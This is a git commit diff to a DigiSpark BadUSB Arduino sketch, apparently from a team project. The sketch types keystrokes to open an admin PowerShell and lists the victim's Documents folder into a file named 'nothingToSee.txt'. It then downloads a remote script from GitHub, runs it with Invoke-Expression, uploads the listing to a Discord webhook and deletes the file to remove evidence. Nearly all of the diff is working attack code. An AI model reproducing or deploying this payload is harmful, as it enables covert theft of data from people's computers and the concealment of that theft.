39dc79ee966c780a97bdfd56bee15f696505e489
Marquito0077 <90941250+Marquito0077@users.noreply.github.com>
2024-01-25 00:15:32 -0400

    Updated Docs Contents Exfiltration
    First version of the code to successfully upload the txt file with the victim's documents folder contents while removing some of the evidence.

--- PowerShell_Exfiltration_BadUSB/PowerShell_Exfiltration_BadUSB.ino
+++ PowerShell_Exfiltration_BadUSB/PowerShell_Exfiltration_BadUSB.ino
@@ -17,34 +17,37 @@
 void setup() {
   DigiKeyboard.update();
   // Accessing PowerShell
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // opens the execute popup
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_A); // selects "PowerShell (Admin)"
-  DigiKeyboard.delay(900);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
-  DigiKeyboard.delay(900);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
 
   // Accessing the Documents Folder
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.println("$pathDocs = [Environment]::GetFolderPath('MyDocuments')"); // gets the folder path
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.println("cd $pathDocs"); // changes directory into that path
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.println("ls | Out-File -FilePath nothingToSee.txt"); // lists the contents of the folder
                                                                     // and outputs it on a text file in the same directory
 
-  //DigiKeyboard.delay(900);
-  // This line is the one that gets the function from git-hub
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)");
 
-  //Digikeyboard.delay(1000);
-  //DigiKeyboard.print("Upload-Discord -file .\nothingToSee.txt"); // uploads the file to the Discord webhook
 
-  //DigiKeyboard.delay(400);
-  //DigiKeyboard.println("rm nothingToSee.txt"); // removes the log file after uploading to Discord
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println('Upload-Discord -file "nothingToSee.txt"'); // uploads the file to the Discord webhook
+
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("rm nothingToSee.txt"); // removes the log file after uploading to Discord
   
-  DigiKeyboard.delay(400);
+  DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");  // closes the PowerShell window
 
   // DEVELOPED BY MARCOS RODRIGUEZ (MIKE ROBLES) FOR TEAM ECHO
